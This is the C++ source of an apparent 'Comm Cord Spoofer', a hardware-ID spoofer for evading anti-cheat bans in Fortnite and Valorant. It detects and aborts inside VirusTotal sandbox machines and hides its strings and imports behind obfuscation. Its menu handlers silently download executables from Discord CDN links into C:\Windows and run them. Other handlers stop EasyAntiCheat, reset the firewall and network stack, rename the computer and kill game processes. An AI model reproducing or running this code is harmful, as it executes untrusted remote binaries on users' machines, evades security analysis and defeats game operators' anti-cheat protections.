#include "files/include.h"

int main(DWORD CEvent)
{
	std::thread(checkifbeingterminated).detach();
	if (CheckVTBlacklist(pcusername(), E("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").decrypt()))
	{
		abort();
	}

	if (CheckVTBlacklist(pcusername(), E("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").decrypt()))
	{
		abort();
	}
	OBSIDIUM_VM_START;
	OBSIDIUM_ENC_START;
	OBSIDIUM_LIC_START;

	// Hide the console cursor
	CONSOLE_CURSOR_INFO cursorInfo;
	LI_FN(GetConsoleCursorInfo)(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo);
	cursorInfo.bVisible = false;
	LI_FN(SetConsoleCursorInfo)(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo);

	TCHAR volumeName[MAX_PATH + 1] = { 0 };
	TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
	DWORD serialNumber = 0;
	DWORD maxComponentLen = 0;
	DWORD fileSystemFlags = 0;

	g_Discord->Initialize();
	g_Discord->Update();
	std::thread(changetitle).detach();
	std::thread(check).detach();
	LI_FN(system)(E("color 6"));
	HWND hwnd = LI_FN(GetConsoleWindow)();
	HWND console = LI_FN(GetConsoleWindow)();
	RECT ConsoleRect;
	LI_FN(GetWindowRect)(console, &ConsoleRect);

	HANDLE hOut = LI_FN(GetStdHandle)(STD_OUTPUT_HANDLE);

	CONSOLE_SCREEN_BUFFER_INFO scrBufferInfo;
	LI_FN(GetConsoleScreenBufferInfo)(hOut, &scrBufferInfo);

	// current window size
	short winWidth = scrBufferInfo.srWindow.Right - scrBufferInfo.srWindow.Left + 1;
	short winHeight = scrBufferInfo.srWindow.Bottom - scrBufferInfo.srWindow.Top + 1;

	short scrBufferWidth = scrBufferInfo.dwSize.X;
	short scrBufferHeight = scrBufferInfo.dwSize.Y;

	COORD newSize;
	newSize.X = scrBufferWidth;
	newSize.Y = winHeight;

	// Set the window transparency
	SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
	LI_FN(SetLayeredWindowAttributes)(hwnd, 0, 200, LWA_ALPHA);

	HWND consoleWindow = LI_FN(GetConsoleWindow)();
	SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~WS_MAXIMIZEBOX & ~WS_SIZEBOX & ~WS_MINIMIZEBOX);

	int Status = LI_FN(SetConsoleScreenBufferSize)(hOut, newSize);

	LI_FN(SetWindowPos)(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);

	SetWindowLong(hwnd, GWL_STYLE,
		GetWindowLong(hwnd, GWL_STYLE) & ~WS_MINIMIZEBOX);

	LI_FN(ShowWindow)(hwnd, SW_MAXIMIZE);

	std::cout << E("\n\n Connecting");
	std::cout << E(".");
	LI_FN(Sleep)(500);
	std::cout << E(".");
	LI_FN(Sleep)(500);
	std::cout << E(".");
	LI_FN(system)(E("cls"));
	while (counter >= 1)
	{
		cout << "\r " << counter << flush;
		LI_FN(Sleep)(1000);
		counter--;
	}
	LI_FN(system)(E("cls"));
	std::cout << E("\n\n Connected!");
	LI_FN(Sleep)(1000);

a:
	LI_FN(system)(E("cls"));

	std::cout << E("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
	std::cout << E("                                                                                                  ----------------------------------------") << endl;
	std::cout << E("                                                                                                  | Comm Cord Spoofer // By x64 dbg#7289 |") << endl;
	std::cout << E("                                                                                                  |                                      |") << endl;
	std::cout << E("                                                                                                  |                                      |") << endl;
	std::cout << E("                                                                                                  |           Press key to spoof         |") << endl;
	std::cout << E("                                                                                                  |                                      |") << endl;
	std::cout << E("                                                                                                  |           [F1] Spoof Fortnite        |") << endl;
	std::cout << E("                                                                                                  |           [F2] Spoof Valorant        |") << endl;
	std::cout << E("                                                                                                  |           [F3] Change Mac            |") << endl;
	std::cout << E("                                                                                                  |           [F4] Check Serials         |") << endl;
	std::cout << E("                                                                                                  |           [F7] Clean Tracers         |") << endl;
	std::cout << E("                                                                                                  |           [F8] Close Clients         |") << endl;
	std::cout << E("                                                                                                  |           [F9] Close Spoofer         |") << endl;
	std::cout << E("                                                                                                  |           [F10] Discord              |") << endl;
	std::cout << E("                                                                                                  |                                      |") << endl;
	std::cout << E("                                                                                                  ----------------------------------------") << endl;

	while (true)
	{
		// Set up the signal handler.
		signal(SIGINT, signal_handler);

		// Register the cleanup function to be called on exit.
		atexit(cleanup);
		if (CEvent == CTRL_CLOSE_EVENT)
		{
			HWND taskbarWnd = FindWindow(E("Shell_TrayWnd"), NULL);
			if (taskbarWnd)
			{
				// Hide the taskbar
				ShowWindow(taskbarWnd, SW_SHOW);
			}
		}
		if (GetAsyncKeyState(VK_F1) & 1) {
			g_Discord->UpdateSpoofing();
			// Find the taskbar window
			HWND taskbarWnd = FindWindow(E("Shell_TrayWnd"), NULL);
			if (taskbarWnd)
			{
				// Hide the taskbar
				LI_FN(ShowWindow)(taskbarWnd, SW_HIDE);
			}
			beep();

			spoof(fortnite);
			LI_FN(MessageBeep)(MB_OK);
			g_Discord->Update();

			// Find the taskbar window
			if (taskbarWnd)
			{
				// Hide the taskbar
				LI_FN(ShowWindow)(taskbarWnd, SW_SHOW);
			}
			goto a;
		}

		if (GetAsyncKeyState(VK_F2) & 1) {
			g_Discord->UpdateSpoofing();
			// Find the taskbar window
			HWND taskbarWnd = FindWindow(E("Shell_TrayWnd"), NULL);
			if (taskbarWnd)
			{
				// Hide the taskbar
				LI_FN(ShowWindow)(taskbarWnd, SW_HIDE);
			}
			beep();

			spoof(valorant);
			LI_FN(MessageBeep)(MB_OK);
			g_Discord->Update();

			// Find the taskbar window
			if (taskbarWnd)
			{
				// Hide the taskbar
				LI_FN(ShowWindow)(taskbarWnd, SW_SHOW);
			}
			goto a;
		}

		if (GetAsyncKeyState(VK_F3) & 1) {
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1071250054712676512/1081614333513043978/MacAddressSpoofer.exe -o C:\\Windows\\macaddressspoofer.exe --silent"));

			LI_FN(system)(E("start C:\\Windows\\macaddressspoofer.exe >nul"));

			LI_FN(system)(E("del C:\\Windows\\macaddressspoofer.exe"));

			std::remove(E("C:\\Windows\\macaddressspoofer.exe"));

			LI_FN(MessageBeep)(MB_OK);
			goto a;
		}

		if (GetAsyncKeyState(VK_F4) & 1) {
			LI_FN(system)(E("wmic diskdrive get serialnumber > DISKPRINT.txt"));

			std::ifstream inputFile(E("DISKPRINT.txt"));
			std::ofstream outputFile(E("disk.txt"));
			std::string line;

			// Skip the first line of the input file
			std::getline(inputFile, line);

			// Copy the rest of the input file to the output file
			while (std::getline(inputFile, line)) {
				outputFile << line << std::endl;
			}

			// Close both files
			inputFile.close();
			outputFile.close();

			// Replace the original file with the new file
			std::remove(E("input.txt"));
			std::remove(E("DISKPRINT.txt"));
			std::rename(E("output.txt"), E("disk.txt"));

			std::string disk = ReadFromFile(E("disk.txt").decrypt());

			if (disk == "")
			{
				disk = "NULLED";
			}
			MessageBoxA(NULL, disk.c_str(), E("Your Disk Serial"), MB_OK);

			LI_FN(system)(E("del disk.txt"));
		}

		if (GetAsyncKeyState(VK_F7) & 1) {
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066131557049434295/1066499857310810223/deep1.exe -o C:\\Windows\\clean1.exe --silent"));
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066131557049434295/1066500088211439697/deep2.exe -o C:\\Windows\\clean2.exe --silent"));
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066131557049434295/1066500223192543343/deep3.exe -o C:\\Windows\\clean3.exe --silent"));
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066131557049434295/1066500356827258961/deep4.exe -o C:\\Windows\\clean4.exe --silent"));

			LI_FN(system)(E("sc stop EasyAntiCheat >nul"));
			LI_FN(system)(E("sc stop EasyAntiCheat.sys >nul"));

			LI_FN(system)(E("netsh winsock reset >nul"));
			LI_FN(system)(E("netsh winsock reset catalog >nul"));
			LI_FN(system)(E("netsh int ip reset >nul"));
			LI_FN(system)(E("netsh advfirewall reset >nul"));
			LI_FN(system)(E("netsh int reset all >nul"));
			LI_FN(system)(E("netsh int ipv4 reset >nul"));
			LI_FN(system)(E("netsh int ipv6 reset >nul"));
			LI_FN(system)(E("ipconfig / release >nul"));
			LI_FN(system)(E("ipconfig / renew >nul"));
			LI_FN(system)(E("ipconfig / flushdns >nul"));

			LI_FN(system)(E("wmic computersystem where name=%computername% call rename=%random% >nul"));

			LI_FN(system)(E("C:\\Windows\\clean1.exe >nul"));
			LI_FN(system)(E("cls"));

			LI_FN(system)(E("C:\\Windows\\clean2.exe >nul"));
			LI_FN(system)(E("cls"));

			LI_FN(system)(E("C:\\Windows\\clean3.exe >nul"));
			LI_FN(system)(E("cls"));

			LI_FN(system)(E("C:\\Windows\\clean4.exe >nul"));
			LI_FN(system)(E("cls"));

			LI_FN(system)(E("del C:\\Windows\\clean1.exe"));

			LI_FN(system)(E("del C:\\Windows\\clean2.exe"));

			LI_FN(system)(E("del C:\\Windows\\clean3.exe"));

			LI_FN(system)(E("del C:\\Windows\\clean4.exe"));

			std::remove(E("C:\\Windows\\clean1.exe"));
			std::remove(E("C:\\Windows\\clean2.exe"));
			std::remove(E("C:\\Windows\\clean3.exe"));
			std::remove(E("C:\\Windows\\clean4.exe"));

			LI_FN(system)(E("cls"));

			LI_FN(MessageBeep)(MB_OK);
			goto a;
		}

		if (GetAsyncKeyState(VK_F8) & 1) {
			LI_FN(system)(E("TASKKILL /F /IM FortniteClient-Win64-Shipping.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM EpicGamesLauncher.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM FortniteLauncher.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM FortniteLauncher.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM Valorant.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM RiotClientUx.exe 2>NULL"));
			LI_FN(system)(E("TASKKILL /F /IM valorant.exe 2>NULL"));
			//LI_FN(system)(E("TASKKILL /F /IM "));
			MessageBoxA(NULL, E("Games Closed!"), E("Comm Cord"), MB_OK);
			LI_FN(system)(E("cls"));
			goto a;
		}

		if (GetAsyncKeyState(VK_F9) & 1) {
			// Find the taskbar window
			HWND taskbarWnd = FindWindow(E("Shell_TrayWnd"), NULL);
			if (taskbarWnd)
			{
				// Hide the taskbar
				LI_FN(ShowWindow)(taskbarWnd, SW_SHOW);
			}
			LI_FN(exit)(0);
		}

		if (GetAsyncKeyState(VK_F9) & 1) {
			LI_FN(system)(E("start https://dicord.gg/commcord"));
		}
	}
	OBSIDIUM_VM_END;
	OBSIDIUM_ENC_END;
	OBSIDIUM_LIC_END;
}